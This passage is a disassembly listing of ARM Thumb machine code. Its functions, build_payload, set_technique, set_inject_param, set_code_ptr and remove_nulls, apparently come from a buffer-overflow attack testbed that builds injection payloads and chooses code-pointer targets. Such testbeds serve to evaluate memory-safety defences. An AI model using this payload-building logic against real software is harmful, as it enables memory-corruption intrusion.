    afea:	687b      	ldr	r3, [r7, #4]
    afec:	3308      	adds	r3, #8
    afee:	4610      	mov	r0, r2
    aff0:	4619      	mov	r1, r3
    aff2:	2204      	movs	r2, #4
    aff4:	f7fd ec8e 	blx	8914 <_init+0x80>
    aff8:	f64c 10ac 	movw	r0, #51628	; 0xc9ac
    affc:	f2c0 0000 	movt	r0, #0
    b000:	f7fd ecb2 	blx	8968 <_init+0xd4>
    b004:	4603      	mov	r3, r0
    b006:	613b      	str	r3, [r7, #16]
    b008:	687b      	ldr	r3, [r7, #4]
    b00a:	68da      	ldr	r2, [r3, #12]
    b00c:	6a79      	ldr	r1, [r7, #36]	; 0x24
    b00e:	69fb      	ldr	r3, [r7, #28]
    b010:	4419      	add	r1, r3
    b012:	687b      	ldr	r3, [r7, #4]
    b014:	69db      	ldr	r3, [r3, #28]
    b016:	1acb      	subs	r3, r1, r3
    b018:	3308      	adds	r3, #8
    b01a:	441a      	add	r2, r3
    b01c:	f107 0310 	add.w	r3, r7, #16
    b020:	4610      	mov	r0, r2
    b022:	4619      	mov	r1, r3
    b024:	2204      	movs	r2, #4
    b026:	f7fd ec76 	blx	8914 <_init+0x80>
    b02a:	687b      	ldr	r3, [r7, #4]
    b02c:	68da      	ldr	r2, [r3, #12]
    b02e:	6a79      	ldr	r1, [r7, #36]	; 0x24
    b030:	69fb      	ldr	r3, [r7, #28]
    b032:	4419      	add	r1, r3
    b034:	687b      	ldr	r3, [r7, #4]
    b036:	69db      	ldr	r3, [r3, #28]
    b038:	1acb      	subs	r3, r1, r3
    b03a:	330c      	adds	r3, #12
    b03c:	4413      	add	r3, r2
    b03e:	4618      	mov	r0, r3
    b040:	4981      	ldr	r1, [pc, #516]	; (b248 <build_payload+0x570>)
    b042:	2204      	movs	r2, #4
    b044:	f7fd ec66 	blx	8914 <_init+0x80>
    b048:	687b      	ldr	r3, [r7, #4]
    b04a:	685b      	ldr	r3, [r3, #4]
    b04c:	1d1a      	adds	r2, r3, #4
    b04e:	687b      	ldr	r3, [r7, #4]
    b050:	605a      	str	r2, [r3, #4]
    b052:	687b      	ldr	r3, [r7, #4]
    b054:	685b      	ldr	r3, [r3, #4]
    b056:	4618      	mov	r0, r3
    b058:	f7fd ec92 	blx	8980 <_init+0xec>
    b05c:	4603      	mov	r3, r0
    b05e:	617b      	str	r3, [r7, #20]
    b060:	687b      	ldr	r3, [r7, #4]
    b062:	68da      	ldr	r2, [r3, #12]
    b064:	687b      	ldr	r3, [r7, #4]
    b066:	685b      	ldr	r3, [r3, #4]
    b068:	6978      	ldr	r0, [r7, #20]
    b06a:	4611      	mov	r1, r2
    b06c:	461a      	mov	r2, r3
    b06e:	f7fd ec52 	blx	8914 <_init+0x80>
    b072:	687b      	ldr	r3, [r7, #4]
    b074:	685b      	ldr	r3, [r3, #4]
    b076:	3b05      	subs	r3, #5
    b078:	697a      	ldr	r2, [r7, #20]
    b07a:	441a      	add	r2, r3
    b07c:	687b      	ldr	r3, [r7, #4]
    b07e:	6a5b      	ldr	r3, [r3, #36]	; 0x24
    b080:	4610      	mov	r0, r2
    b082:	4619      	mov	r1, r3
    b084:	2204      	movs	r2, #4
    b086:	f7fd ec46 	blx	8914 <_init+0x80>
    b08a:	687b      	ldr	r3, [r7, #4]
    b08c:	68db      	ldr	r3, [r3, #12]
    b08e:	4618      	mov	r0, r3
    b090:	f7fd ec3a 	blx	8908 <_init+0x74>
    b094:	687b      	ldr	r3, [r7, #4]
    b096:	697a      	ldr	r2, [r7, #20]
    b098:	60da      	str	r2, [r3, #12]
    b09a:	e13c      	b.n	b316 <build_payload+0x63e>
    b09c:	f646 2388 	movw	r3, #27272	; 0x6a88
    b0a0:	f2c0 0301 	movt	r3, #1
    b0a4:	681b      	ldr	r3, [r3, #0]
    b0a6:	2b65      	cmp	r3, #101	; 0x65
    b0a8:	d156      	bne.n	b158 <build_payload+0x480>
    b0aa:	687b      	ldr	r3, [r7, #4]
    b0ac:	68da      	ldr	r2, [r3, #12]
    b0ae:	6a79      	ldr	r1, [r7, #36]	; 0x24
    b0b0:	69fb      	ldr	r3, [r7, #28]
    b0b2:	4419      	add	r1, r3
    b0b4:	687b      	ldr	r3, [r7, #4]
    b0b6:	69db      	ldr	r3, [r3, #28]
    b0b8:	1acb      	subs	r3, r1, r3
    b0ba:	441a      	add	r2, r3
    b0bc:	687b      	ldr	r3, [r7, #4]
    b0be:	3320      	adds	r3, #32
    b0c0:	4610      	mov	r0, r2
    b0c2:	4619      	mov	r1, r3
    b0c4:	2204      	movs	r2, #4
    b0c6:	f7fd ec26 	blx	8914 <_init+0x80>
    b0ca:	f64c 10ac 	movw	r0, #51628	; 0xc9ac
    b0ce:	f2c0 0000 	movt	r0, #0
    b0d2:	f7fd ec4a 	blx	8968 <_init+0xd4>
    b0d6:	4603      	mov	r3, r0
    b0d8:	613b      	str	r3, [r7, #16]
    b0da:	687b      	ldr	r3, [r7, #4]
    b0dc:	68da      	ldr	r2, [r3, #12]
    b0de:	6a79      	ldr	r1, [r7, #36]	; 0x24
    b0e0:	69fb      	ldr	r3, [r7, #28]
    b0e2:	4419      	add	r1, r3
    b0e4:	687b      	ldr	r3, [r7, #4]
    b0e6:	69db      	ldr	r3, [r3, #28]
    b0e8:	1acb      	subs	r3, r1, r3
    b0ea:	3304      	adds	r3, #4
    b0ec:	441a      	add	r2, r3
    b0ee:	f107 0310 	add.w	r3, r7, #16
    b0f2:	4610      	mov	r0, r2
    b0f4:	4619      	mov	r1, r3
    b0f6:	2204      	movs	r2, #4
    b0f8:	f7fd ec0c 	blx	8914 <_init+0x80>
    b0fc:	687b      	ldr	r3, [r7, #4]
    b0fe:	68da      	ldr	r2, [r3, #12]
    b100:	6a79      	ldr	r1, [r7, #36]	; 0x24
    b102:	69fb      	ldr	r3, [r7, #28]
    b104:	4419      	add	r1, r3
    b106:	687b      	ldr	r3, [r7, #4]
    b108:	69db      	ldr	r3, [r3, #28]
    b10a:	1acb      	subs	r3, r1, r3
    b10c:	3308      	adds	r3, #8
    b10e:	441a      	add	r2, r3
    b110:	f107 0310 	add.w	r3, r7, #16
    b114:	4610      	mov	r0, r2
    b116:	4619      	mov	r1, r3
    b118:	2204      	movs	r2, #4
    b11a:	f7fd ebfc 	blx	8914 <_init+0x80>
    b11e:	687b      	ldr	r3, [r7, #4]
    b120:	68da      	ldr	r2, [r3, #12]
    b122:	6a79      	ldr	r1, [r7, #36]	; 0x24
    b124:	69fb      	ldr	r3, [r7, #28]
    b126:	4419      	add	r1, r3
    b128:	687b      	ldr	r3, [r7, #4]
    b12a:	69db      	ldr	r3, [r3, #28]
    b12c:	1acb      	subs	r3, r1, r3
    b12e:	330c      	adds	r3, #12
    b130:	4413      	add	r3, r2
    b132:	4618      	mov	r0, r3
    b134:	4944      	ldr	r1, [pc, #272]	; (b248 <build_payload+0x570>)
    b136:	2204      	movs	r2, #4
    b138:	f7fd ebec 	blx	8914 <_init+0x80>
    b13c:	687b      	ldr	r3, [r7, #4]
    b13e:	68da      	ldr	r2, [r3, #12]
    b140:	6a79      	ldr	r1, [r7, #36]	; 0x24
    b142:	69fb      	ldr	r3, [r7, #28]
    b144:	440b      	add	r3, r1
    b146:	441a      	add	r2, r3
    b148:	687b      	ldr	r3, [r7, #4]
    b14a:	3308      	adds	r3, #8
    b14c:	4610      	mov	r0, r2
    b14e:	4619      	mov	r1, r3
    b150:	2204      	movs	r2, #4
    b152:	f7fd ebe0 	blx	8914 <_init+0x80>
    b156:	e0de      	b.n	b316 <build_payload+0x63e>
    b158:	f646 0350 	movw	r3, #26704	; 0x6850
    b15c:	f2c0 0301 	movt	r3, #1
    b160:	681b      	ldr	r3, [r3, #0]
    b162:	2b00      	cmp	r3, #0
    b164:	d00c      	beq.n	b180 <build_payload+0x4a8>
    b166:	f646 0360 	movw	r3, #26720	; 0x6860
    b16a:	f2c0 0301 	movt	r3, #1
    b16e:	681b      	ldr	r3, [r3, #0]
    b170:	f24d 10d0 	movw	r0, #53712	; 0xd1d0
    b174:	f2c0 0000 	movt	r0, #0
    b178:	2101      	movs	r1, #1
    b17a:	2229      	movs	r2, #41	; 0x29
    b17c:	f7fd ebe2 	blx	8944 <_init+0xb0>
    b180:	2001      	movs	r0, #1
    b182:	f7fd ec16 	blx	89b0 <_init+0x11c>
    b186:	f646 2388 	movw	r3, #27272	; 0x6a88
    b18a:	f2c0 0301 	movt	r3, #1
    b18e:	681b      	ldr	r3, [r3, #0]
    b190:	2b64      	cmp	r3, #100	; 0x64
    b192:	f040 80b3 	bne.w	b2fc <build_payload+0x624>
    b196:	f646 2388 	movw	r3, #27272	; 0x6a88
    b19a:	f2c0 0301 	movt	r3, #1
    b19e:	689b      	ldr	r3, [r3, #8]
    b1a0:	f5b3 7f96 	cmp.w	r3, #300	; 0x12c
    b1a4:	f040 80aa 	bne.w	b2fc <build_payload+0x624>
    b1a8:	f646 2388 	movw	r3, #27272	; 0x6a88
    b1ac:	f2c0 0301 	movt	r3, #1
    b1b0:	685b      	ldr	r3, [r3, #4]
    b1b2:	2bcd      	cmp	r3, #205	; 0xcd
    b1b4:	d14a      	bne.n	b24c <build_payload+0x574>
    b1b6:	f646 0360 	movw	r3, #26720	; 0x6860
    b1ba:	f2c0 0301 	movt	r3, #1
    b1be:	681b      	ldr	r3, [r3, #0]
    b1c0:	f24d 2058 	movw	r0, #53848	; 0xd258
    b1c4:	f2c0 0000 	movt	r0, #0
    b1c8:	2101      	movs	r1, #1
    b1ca:	2213      	movs	r2, #19
    b1cc:	f7fd ebba 	blx	8944 <_init+0xb0>
    b1d0:	687b      	ldr	r3, [r7, #4]
    b1d2:	685b      	ldr	r3, [r3, #4]
    b1d4:	f103 021c 	add.w	r2, r3, #28
    b1d8:	687b      	ldr	r3, [r7, #4]
    b1da:	605a      	str	r2, [r3, #4]
    b1dc:	687b      	ldr	r3, [r7, #4]
    b1de:	685b      	ldr	r3, [r3, #4]
    b1e0:	4618      	mov	r0, r3
    b1e2:	f7fd ebce 	blx	8980 <_init+0xec>
    b1e6:	4603      	mov	r3, r0
    b1e8:	617b      	str	r3, [r7, #20]
    b1ea:	687b      	ldr	r3, [r7, #4]
    b1ec:	68da      	ldr	r2, [r3, #12]
    b1ee:	687b      	ldr	r3, [r7, #4]
    b1f0:	685b      	ldr	r3, [r3, #4]
    b1f2:	6978      	ldr	r0, [r7, #20]
    b1f4:	4611      	mov	r1, r2
    b1f6:	461a      	mov	r2, r3
    b1f8:	f7fd eb8c 	blx	8914 <_init+0x80>
    b1fc:	687b      	ldr	r3, [r7, #4]
    b1fe:	685b      	ldr	r3, [r3, #4]
    b200:	3b05      	subs	r3, #5
    b202:	697a      	ldr	r2, [r7, #20]
    b204:	441a      	add	r2, r3
    b206:	687b      	ldr	r3, [r7, #4]
    b208:	6a5b      	ldr	r3, [r3, #36]	; 0x24
    b20a:	4610      	mov	r0, r2
    b20c:	4619      	mov	r1, r3
    b20e:	2204      	movs	r2, #4
    b210:	f7fd eb80 	blx	8914 <_init+0x80>
    b214:	687b      	ldr	r3, [r7, #4]
    b216:	68db      	ldr	r3, [r3, #12]
    b218:	4618      	mov	r0, r3
    b21a:	f7fd eb76 	blx	8908 <_init+0x74>
    b21e:	687b      	ldr	r3, [r7, #4]
    b220:	697a      	ldr	r2, [r7, #20]
    b222:	60da      	str	r2, [r3, #12]
    b224:	687b      	ldr	r3, [r7, #4]
    b226:	68da      	ldr	r2, [r3, #12]
    b228:	6a79      	ldr	r1, [r7, #36]	; 0x24
    b22a:	69fb      	ldr	r3, [r7, #28]
    b22c:	440b      	add	r3, r1
    b22e:	4413      	add	r3, r2
    b230:	4618      	mov	r0, r3
    b232:	f646 0154 	movw	r1, #26708	; 0x6854
    b236:	f2c0 0101 	movt	r1, #1
    b23a:	221c      	movs	r2, #28
    b23c:	f7fd eb6a 	blx	8914 <_init+0x80>
    b240:	e069      	b.n	b316 <build_payload+0x63e>
    b242:	bf00      	nop
    b244:	000166b4 	.word	0x000166b4
    b248:	000166bc 	.word	0x000166bc
    b24c:	687b      	ldr	r3, [r7, #4]
    b24e:	685b      	ldr	r3, [r3, #4]
    b250:	f103 020c 	add.w	r2, r3, #12
    b254:	687b      	ldr	r3, [r7, #4]
    b256:	605a      	str	r2, [r3, #4]
    b258:	687b      	ldr	r3, [r7, #4]
    b25a:	685b      	ldr	r3, [r3, #4]
    b25c:	4618      	mov	r0, r3
    b25e:	f7fd eb90 	blx	8980 <_init+0xec>
    b262:	4603      	mov	r3, r0
    b264:	617b      	str	r3, [r7, #20]
    b266:	687b      	ldr	r3, [r7, #4]
    b268:	68da      	ldr	r2, [r3, #12]
    b26a:	687b      	ldr	r3, [r7, #4]
    b26c:	685b      	ldr	r3, [r3, #4]
    b26e:	6978      	ldr	r0, [r7, #20]
    b270:	4611      	mov	r1, r2
    b272:	461a      	mov	r2, r3
    b274:	f7fd eb4e 	blx	8914 <_init+0x80>
    b278:	687b      	ldr	r3, [r7, #4]
    b27a:	685b      	ldr	r3, [r3, #4]
    b27c:	3b05      	subs	r3, #5
    b27e:	697a      	ldr	r2, [r7, #20]
    b280:	441a      	add	r2, r3
    b282:	687b      	ldr	r3, [r7, #4]
    b284:	6a5b      	ldr	r3, [r3, #36]	; 0x24
    b286:	4610      	mov	r0, r2
    b288:	4619      	mov	r1, r3
    b28a:	2204      	movs	r2, #4
    b28c:	f7fd eb42 	blx	8914 <_init+0x80>
    b290:	687b      	ldr	r3, [r7, #4]
    b292:	68db      	ldr	r3, [r3, #12]
    b294:	4618      	mov	r0, r3
    b296:	f7fd eb38 	blx	8908 <_init+0x74>
    b29a:	687b      	ldr	r3, [r7, #4]
    b29c:	697a      	ldr	r2, [r7, #20]
    b29e:	60da      	str	r2, [r3, #12]
    b2a0:	f64c 10ac 	movw	r0, #51628	; 0xc9ac
    b2a4:	f2c0 0000 	movt	r0, #0
    b2a8:	f7fd eb5e 	blx	8968 <_init+0xd4>
    b2ac:	4603      	mov	r3, r0
    b2ae:	613b      	str	r3, [r7, #16]
    b2b0:	687b      	ldr	r3, [r7, #4]
    b2b2:	68da      	ldr	r2, [r3, #12]
    b2b4:	687b      	ldr	r3, [r7, #4]
    b2b6:	685b      	ldr	r3, [r3, #4]
    b2b8:	3b09      	subs	r3, #9
    b2ba:	441a      	add	r2, r3
    b2bc:	f107 0310 	add.w	r3, r7, #16
    b2c0:	4610      	mov	r0, r2
    b2c2:	4619      	mov	r1, r3
    b2c4:	2204      	movs	r2, #4
    b2c6:	f7fd eb26 	blx	8914 <_init+0x80>
    b2ca:	687b      	ldr	r3, [r7, #4]
    b2cc:	68da      	ldr	r2, [r3, #12]
    b2ce:	687b      	ldr	r3, [r7, #4]
    b2d0:	685b      	ldr	r3, [r3, #4]
    b2d2:	3b05      	subs	r3, #5
    b2d4:	4413      	add	r3, r2
    b2d6:	4618      	mov	r0, r3
    b2d8:	4923      	ldr	r1, [pc, #140]	; (b368 <build_payload+0x690>)
    b2da:	2204      	movs	r2, #4
    b2dc:	f7fd eb1a 	blx	8914 <_init+0x80>
    b2e0:	687b      	ldr	r3, [r7, #4]
    b2e2:	68da      	ldr	r2, [r3, #12]
    b2e4:	6a79      	ldr	r1, [r7, #36]	; 0x24
    b2e6:	69fb      	ldr	r3, [r7, #28]
    b2e8:	440b      	add	r3, r1
    b2ea:	441a      	add	r2, r3
    b2ec:	687b      	ldr	r3, [r7, #4]
    b2ee:	3308      	adds	r3, #8
    b2f0:	4610      	mov	r0, r2
    b2f2:	4619      	mov	r1, r3
    b2f4:	2204      	movs	r2, #4
    b2f6:	f7fd eb0e 	blx	8914 <_init+0x80>
    b2fa:	e00c      	b.n	b316 <build_payload+0x63e>
    b2fc:	687b      	ldr	r3, [r7, #4]
    b2fe:	68da      	ldr	r2, [r3, #12]
    b300:	6a79      	ldr	r1, [r7, #36]	; 0x24
    b302:	69fb      	ldr	r3, [r7, #28]
    b304:	440b      	add	r3, r1
    b306:	441a      	add	r2, r3
    b308:	687b      	ldr	r3, [r7, #4]
    b30a:	3308      	adds	r3, #8
    b30c:	4610      	mov	r0, r2
    b30e:	4619      	mov	r1, r3
    b310:	2204      	movs	r2, #4
    b312:	f7fd eb00 	blx	8914 <_init+0x80>
    b316:	f646 2388 	movw	r3, #27272	; 0x6a88
    b31a:	f2c0 0301 	movt	r3, #1
    b31e:	691b      	ldr	r3, [r3, #16]
    b320:	f5b3 7ffa 	cmp.w	r3, #500	; 0x1f4
    b324:	d010      	beq.n	b348 <build_payload+0x670>
    b326:	f646 2388 	movw	r3, #27272	; 0x6a88
    b32a:	f2c0 0301 	movt	r3, #1
    b32e:	691a      	ldr	r2, [r3, #16]
    b330:	f240 13fd 	movw	r3, #509	; 0x1fd
    b334:	429a      	cmp	r2, r3
    b336:	d007      	beq.n	b348 <build_payload+0x670>
    b338:	687b      	ldr	r3, [r7, #4]
    b33a:	68da      	ldr	r2, [r3, #12]
    b33c:	687b      	ldr	r3, [r7, #4]
    b33e:	685b      	ldr	r3, [r3, #4]
    b340:	4610      	mov	r0, r2
    b342:	4619      	mov	r1, r3
    b344:	f000 fbde 	bl	bb04 <remove_nulls>
    b348:	687b      	ldr	r3, [r7, #4]
    b34a:	68da      	ldr	r2, [r3, #12]
    b34c:	687b      	ldr	r3, [r7, #4]
    b34e:	685b      	ldr	r3, [r3, #4]
    b350:	3b01      	subs	r3, #1
    b352:	4413      	add	r3, r2
    b354:	4618      	mov	r0, r3
    b356:	2100      	movs	r1, #0
    b358:	2201      	movs	r2, #1
    b35a:	f7fd eb54 	blx	8a04 <_init+0x170>
    b35e:	2301      	movs	r3, #1
    b360:	4618      	mov	r0, r3
    b362:	3728      	adds	r7, #40	; 0x28
    b364:	46bd      	mov	sp, r7
    b366:	bd80      	pop	{r7, pc}
    b368:	000166bc 	.word	0x000166bc

0000b36c <set_technique>:
    b36c:	b580      	push	{r7, lr}
    b36e:	b082      	sub	sp, #8
    b370:	af00      	add	r7, sp, #0
    b372:	6078      	str	r0, [r7, #4]
    b374:	f246 03b0 	movw	r3, #24752	; 0x60b0
    b378:	f2c0 0301 	movt	r3, #1
    b37c:	681b      	ldr	r3, [r3, #0]
    b37e:	6878      	ldr	r0, [r7, #4]
    b380:	4619      	mov	r1, r3
    b382:	f7fd ea98 	blx	88b4 <_init+0x20>
    b386:	4603      	mov	r3, r0
    b388:	2b00      	cmp	r3, #0
    b38a:	d106      	bne.n	b39a <set_technique+0x2e>
    b38c:	f646 2388 	movw	r3, #27272	; 0x6a88
    b390:	f2c0 0301 	movt	r3, #1
    b394:	2264      	movs	r2, #100	; 0x64
    b396:	601a      	str	r2, [r3, #0]
    b398:	e01f      	b.n	b3da <set_technique+0x6e>
    b39a:	f246 03b0 	movw	r3, #24752	; 0x60b0
    b39e:	f2c0 0301 	movt	r3, #1
    b3a2:	685b      	ldr	r3, [r3, #4]
    b3a4:	6878      	ldr	r0, [r7, #4]
    b3a6:	4619      	mov	r1, r3
    b3a8:	f7fd ea84 	blx	88b4 <_init+0x20>
    b3ac:	4603      	mov	r3, r0
    b3ae:	2b00      	cmp	r3, #0
    b3b0:	d106      	bne.n	b3c0 <set_technique+0x54>
    b3b2:	f646 2388 	movw	r3, #27272	; 0x6a88
    b3b6:	f2c0 0301 	movt	r3, #1
    b3ba:	2265      	movs	r2, #101	; 0x65
    b3bc:	601a      	str	r2, [r3, #0]
    b3be:	e00c      	b.n	b3da <set_technique+0x6e>
    b3c0:	f646 0360 	movw	r3, #26720	; 0x6860
    b3c4:	f2c0 0301 	movt	r3, #1
    b3c8:	681b      	ldr	r3, [r3, #0]
    b3ca:	4618      	mov	r0, r3
    b3cc:	f24d 216c 	movw	r1, #53868	; 0xd26c
    b3d0:	f2c0 0100 	movt	r1, #0
    b3d4:	687a      	ldr	r2, [r7, #4]
    b3d6:	f7fd eafe 	blx	89d4 <_init+0x140>
    b3da:	3708      	adds	r7, #8
    b3dc:	46bd      	mov	sp, r7
    b3de:	bd80      	pop	{r7, pc}

0000b3e0 <set_inject_param>:
    b3e0:	b580      	push	{r7, lr}
    b3e2:	b082      	sub	sp, #8
    b3e4:	af00      	add	r7, sp, #0
    b3e6:	6078      	str	r0, [r7, #4]
    b3e8:	f246 03bc 	movw	r3, #24764	; 0x60bc
    b3ec:	f2c0 0301 	movt	r3, #1
    b3f0:	681b      	ldr	r3, [r3, #0]
    b3f2:	6878      	ldr	r0, [r7, #4]
    b3f4:	4619      	mov	r1, r3
    b3f6:	f7fd ea5e 	blx	88b4 <_init+0x20>
    b3fa:	4603      	mov	r3, r0
    b3fc:	2b00      	cmp	r3, #0
    b3fe:	d106      	bne.n	b40e <set_inject_param+0x2e>
    b400:	f646 2388 	movw	r3, #27272	; 0x6a88
    b404:	f2c0 0301 	movt	r3, #1
    b408:	22c8      	movs	r2, #200	; 0xc8
    b40a:	605a      	str	r2, [r3, #4]
    b40c:	e075      	b.n	b4fa <set_inject_param+0x11a>
    b40e:	f246 03bc 	movw	r3, #24764	; 0x60bc
    b412:	f2c0 0301 	movt	r3, #1
    b416:	685b      	ldr	r3, [r3, #4]
    b418:	6878      	ldr	r0, [r7, #4]
    b41a:	4619      	mov	r1, r3
    b41c:	f7fd ea4a 	blx	88b4 <_init+0x20>
    b420:	4603      	mov	r3, r0
    b422:	2b00      	cmp	r3, #0
    b424:	d106      	bne.n	b434 <set_inject_param+0x54>
    b426:	f646 2388 	movw	r3, #27272	; 0x6a88
    b42a:	f2c0 0301 	movt	r3, #1
    b42e:	22c9      	movs	r2, #201	; 0xc9
    b430:	605a      	str	r2, [r3, #4]
    b432:	e062      	b.n	b4fa <set_inject_param+0x11a>
    b434:	f246 03bc 	movw	r3, #24764	; 0x60bc
    b438:	f2c0 0301 	movt	r3, #1
    b43c:	689b      	ldr	r3, [r3, #8]
    b43e:	6878      	ldr	r0, [r7, #4]
    b440:	4619      	mov	r1, r3
    b442:	f7fd ea38 	blx	88b4 <_init+0x20>
    b446:	4603      	mov	r3, r0
    b448:	2b00      	cmp	r3, #0
    b44a:	d106      	bne.n	b45a <set_inject_param+0x7a>
    b44c:	f646 2388 	movw	r3, #27272	; 0x6a88
    b450:	f2c0 0301 	movt	r3, #1
    b454:	22ca      	movs	r2, #202	; 0xca
    b456:	605a      	str	r2, [r3, #4]
    b458:	e04f      	b.n	b4fa <set_inject_param+0x11a>
    b45a:	f246 03bc 	movw	r3, #24764	; 0x60bc
    b45e:	f2c0 0301 	movt	r3, #1
    b462:	68db      	ldr	r3, [r3, #12]
    b464:	6878      	ldr	r0, [r7, #4]
    b466:	4619      	mov	r1, r3
    b468:	f7fd ea24 	blx	88b4 <_init+0x20>
    b46c:	4603      	mov	r3, r0
    b46e:	2b00      	cmp	r3, #0
    b470:	d106      	bne.n	b480 <set_inject_param+0xa0>
    b472:	f646 2388 	movw	r3, #27272	; 0x6a88
    b476:	f2c0 0301 	movt	r3, #1
    b47a:	22cb      	movs	r2, #203	; 0xcb
    b47c:	605a      	str	r2, [r3, #4]
    b47e:	e03c      	b.n	b4fa <set_inject_param+0x11a>
    b480:	f246 03bc 	movw	r3, #24764	; 0x60bc
    b484:	f2c0 0301 	movt	r3, #1
    b488:	691b      	ldr	r3, [r3, #16]
    b48a:	6878      	ldr	r0, [r7, #4]
    b48c:	4619      	mov	r1, r3
    b48e:	f7fd ea12 	blx	88b4 <_init+0x20>
    b492:	4603      	mov	r3, r0
    b494:	2b00      	cmp	r3, #0
    b496:	d106      	bne.n	b4a6 <set_inject_param+0xc6>
    b498:	f646 2388 	movw	r3, #27272	; 0x6a88
    b49c:	f2c0 0301 	movt	r3, #1
    b4a0:	22cc      	movs	r2, #204	; 0xcc
    b4a2:	605a      	str	r2, [r3, #4]
    b4a4:	e029      	b.n	b4fa <set_inject_param+0x11a>
    b4a6:	f246 03bc 	movw	r3, #24764	; 0x60bc
    b4aa:	f2c0 0301 	movt	r3, #1
    b4ae:	695b      	ldr	r3, [r3, #20]
    b4b0:	6878      	ldr	r0, [r7, #4]
    b4b2:	4619      	mov	r1, r3
    b4b4:	f7fd e9fe 	blx	88b4 <_init+0x20>
    b4b8:	4603      	mov	r3, r0
    b4ba:	2b00      	cmp	r3, #0
    b4bc:	d106      	bne.n	b4cc <set_inject_param+0xec>
    b4be:	f646 2388 	movw	r3, #27272	; 0x6a88
    b4c2:	f2c0 0301 	movt	r3, #1
    b4c6:	22cd      	movs	r2, #205	; 0xcd
    b4c8:	605a      	str	r2, [r3, #4]
    b4ca:	e016      	b.n	b4fa <set_inject_param+0x11a>
    b4cc:	f646 0350 	movw	r3, #26704	; 0x6850
    b4d0:	f2c0 0301 	movt	r3, #1
    b4d4:	681b      	ldr	r3, [r3, #0]
    b4d6:	2b00      	cmp	r3, #0
    b4d8:	d00c      	beq.n	b4f4 <set_inject_param+0x114>
    b4da:	f646 0360 	movw	r3, #26720	; 0x6860
    b4de:	f2c0 0301 	movt	r3, #1
    b4e2:	681b      	ldr	r3, [r3, #0]
    b4e4:	4618      	mov	r0, r3
    b4e6:	f24d 2198 	movw	r1, #53912	; 0xd298
    b4ea:	f2c0 0100 	movt	r1, #0
    b4ee:	687a      	ldr	r2, [r7, #4]
    b4f0:	f7fd ea70 	blx	89d4 <_init+0x140>
    b4f4:	2001      	movs	r0, #1
    b4f6:	f7fd ea5c 	blx	89b0 <_init+0x11c>
    b4fa:	3708      	adds	r7, #8
    b4fc:	46bd      	mov	sp, r7
    b4fe:	bd80      	pop	{r7, pc}

0000b500 <set_code_ptr>:
    b500:	b580      	push	{r7, lr}
    b502:	b082      	sub	sp, #8
    b504:	af00      	add	r7, sp, #0
    b506:	6078      	str	r0, [r7, #4]
    b508:	f246 03d8 	movw	r3, #24792	; 0x60d8
    b50c:	f2c0 0301 	movt	r3, #1
    b510:	681b      	ldr	r3, [r3, #0]
    b512:	6878      	ldr	r0, [r7, #4]
    b514:	4619      	mov	r1, r3
    b516:	f7fd e9ce 	blx	88b4 <_init+0x20>
    b51a:	4603      	mov	r3, r0
    b51c:	2b00      	cmp	r3, #0
    b51e:	d107      	bne.n	b530 <set_code_ptr+0x30>
    b520:	f646 2388 	movw	r3, #27272	; 0x6a88
    b524:	f2c0 0301 	movt	r3, #1
    b528:	f44f 7296 	mov.w	r2, #300	; 0x12c
    b52c:	609a      	str	r2, [r3, #8]
    b52e:	e142      	b.n	b7b6 <set_code_ptr+0x2b6>
    b530:	f246 03d8 	movw	r3, #24792	; 0x60d8
    b534:	f2c0 0301 	movt	r3, #1
    b538:	685b      	ldr	r3, [r3, #4]
    b53a:	6878      	ldr	r0, [r7, #4]
    b53c:	4619      	mov	r1, r3
    b53e:	f7fd e9ba 	blx	88b4 <_init+0x20>
    b542:	4603      	mov	r3, r0
    b544:	2b00      	cmp	r3, #0
    b546:	d107      	bne.n	b558 <set_code_ptr+0x58>
    b548:	f646 2388 	movw	r3, #27272	; 0x6a88
    b54c:	f2c0 0301 	movt	r3, #1
    b550:	f240 122d 	movw	r2, #301	; 0x12d
    b554:	609a      	str	r2, [r3, #8]
    b556:	e12e      	b.n	b7b6 <set_code_ptr+0x2b6>
    b558:	f246 03d8 	movw	r3, #24792	; 0x60d8
    b55c:	f2c0 0301 	movt	r3, #1
    b560:	689b      	ldr	r3, [r3, #8]
    b562:	6878      	ldr	r0, [r7, #4]
    b564:	4619      	mov	r1, r3
    b566:	f7fd e9a6 	blx	88b4 <_init+0x20>
    b56a:	4603      	mov	r3, r0
    b56c:	2b00      	cmp	r3, #0
    b56e:	d107      	bne.n	b580 <set_code_ptr+0x80>
    b570:	f646 2388 	movw	r3, #27272	; 0x6a88
    b574:	f2c0 0301 	movt	r3, #1
    b578:	f44f 7297 	mov.w	r2, #302	; 0x12e
    b57c:	609a      	str	r2, [r3, #8]
    b57e:	e11a      	b.n	b7b6 <set_code_ptr+0x2b6>
    b580:	f246 03d8 	movw	r3, #24792	; 0x60d8
    b584:	f2c0 0301 	movt	r3, #1
    b588:	68db      	ldr	r3, [r3, #12]
    b58a:	6878      	ldr	r0, [r7, #4]
    b58c:	4619      	mov	r1, r3
    b58e:	f7fd e992 	blx	88b4 <_init+0x20>
    b592:	4603      	mov	r3, r0
    b594:	2b00      	cmp	r3, #0
    b596:	d107      	bne.n	b5a8 <set_code_ptr+0xa8>
    b598:	f646 2388 	movw	r3, #27272	; 0x6a88
    b59c:	f2c0 0301 	movt	r3, #1
    b5a0:	f240 122f 	movw	r2, #303	; 0x12f
    b5a4:	609a      	str	r2, [r3, #8]
    b5a6:	e106      	b.n	b7b6 <set_code_ptr+0x2b6>
    b5a8:	f246 03d8 	movw	r3, #24792	; 0x60d8
    b5ac:	f2c0 0301 	movt	r3, #1
    b5b0:	691b      	ldr	r3, [r3, #16]
    b5b2:	6878      	ldr	r0, [r7, #4]
    b5b4:	4619      	mov	r1, r3
    b5b6:	f7fd e97e 	blx	88b4 <_init+0x20>
    b5ba:	4603      	mov	r3, r0
    b5bc:	2b00      	cmp	r3, #0
    b5be:	d107      	bne.n	b5d0 <set_code_ptr+0xd0>
    b5c0:	f646 2388 	movw	r3, #27272	; 0x6a88
    b5c4:	f2c0 0301 	movt	r3, #1
    b5c8:	f44f 7298 	mov.w	r2, #304	; 0x130
    b5cc:	609a      	str	r2, [r3, #8]
    b5ce:	e0f2      	b.n	b7b6 <set_code_ptr+0x2b6>
    b5d0:	f246 03d8 	movw	r3, #24792	; 0x60d8
    b5d4:	f2c0 0301 	movt	r3, #1
    b5d8:	695b      	ldr	r3, [r3, #20]
    b5da:	6878      	ldr	r0, [r7, #4]
    b5dc:	4619      	mov	r1, r3
    b5de:	f7fd e96a 	blx	88b4 <_init+0x20>
    b5e2:	4603      	mov	r3, r0
    b5e4:	2b00      	cmp	r3, #0
